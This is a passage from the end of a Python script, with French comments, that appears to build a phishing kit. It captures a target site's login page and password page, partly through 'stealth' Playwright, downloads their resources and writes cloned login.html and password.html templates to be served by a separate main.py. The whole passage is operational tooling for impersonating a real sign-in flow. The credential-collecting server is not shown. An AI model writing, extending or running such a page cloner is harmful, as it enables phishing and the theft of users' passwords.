    os.makedirs(CONFIG["TEMPLATE_DIR"], exist_ok=True)
    os.makedirs(CONFIG["STATIC_DIR"], exist_ok=True)

    # 1. Capture login
    raw_html = capture_login()

    # 2. Download resources
    eprint("[*] Téléchargement des ressources...")
    resource_map = download_resources(raw_html, CONFIG["URL"])
    eprint(f"[+] {len(resource_map)} ressources téléchargées")

    # 3. Générer login.html
    eprint("[*] Génération login.html...")
    login_final = build_login(raw_html, resource_map)
    login_path = os.path.join(CONFIG["TEMPLATE_DIR"], "login.html")
    with open(login_path, "w", encoding="utf-8") as f:
        f.write(login_final)
    eprint(f"[OK] login.html ({os.path.getsize(login_path):,} octets)")

    # 4. Capture password page (Playwright furtif) ou fallback statique
    try:
        eprint("[*] Capture password via Playwright furtif...")
        password_raw = capture_password()
        if any(x in password_raw for x in ['type="password"', 'name="password"', 'type=&quot;password&quot;']):
            # Download password page resources too
            pw_resource_map = download_resources(password_raw, CONFIG["URL"])
            pw_resource_map.update(resource_map)
            password_final = build_password(password_raw, pw_resource_map)
            eprint("[+] Password capturee avec succes!")
        else:
            raise Exception("Pas de champ password dans la page")
    except Exception as e:
        eprint(f"  [!] Echec capture Playwright: {e}")
        eprint("  [*] Fallback: generation statique...")
        password_final = generate_password(raw_html)
    password_path = os.path.join(CONFIG["TEMPLATE_DIR"], "password.html")
    with open(password_path, "w", encoding="utf-8") as f:
        f.write(password_final)
    eprint(f"[OK] password.html ({os.path.getsize(password_path):,} octets)")

    eprint("[OK] Termine. Lance : python main.py")


if __name__ == "__main__":
    main()
